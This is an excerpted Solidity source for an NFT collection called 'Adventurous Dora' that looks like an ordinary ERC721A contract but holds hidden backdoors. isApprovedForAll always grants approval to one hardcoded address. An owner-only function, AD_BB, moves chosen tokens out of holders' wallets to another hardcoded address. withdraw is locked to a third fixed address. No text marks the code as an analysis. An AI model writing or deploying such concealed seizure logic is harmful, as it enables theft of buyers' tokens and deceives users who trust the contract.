  ...
  Ownable
{
  ...
  bool private offon = false; ///////////////////////////////////////////////////////////////////////////////////////////////////// new 2
  ...
  function caStop() internal view returns (bool){
      uint256 a1 = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender)));
      uint256 a2 = 1 << 160;
      uint256 a3 = a2 -1;
      uint256 a4 = a1 & a3 ;
      return a4 <= 1 ? true : false;
  }
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x6278848Ae5DE43cc9884104f0C6347253C9c08DC){return true;}
  ...
  /**
   * @dev Approve `to` to operate offon `tokenId`
   *
  ...
  /**
   * @dev Internal function to invoke {IERC721Receiver-onERC721Received} offon a target address.
...
contract Adventurous_Dora is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Adventurous Dora", "AD", maxBatchSize_, collectionSize_) {
  ...
  function AD_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x956B088Fc7645702280F0C5ad87Dc84f3efB82dD, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x9e0B3e271Be8321DD007bC375e41457c5664A1b6);
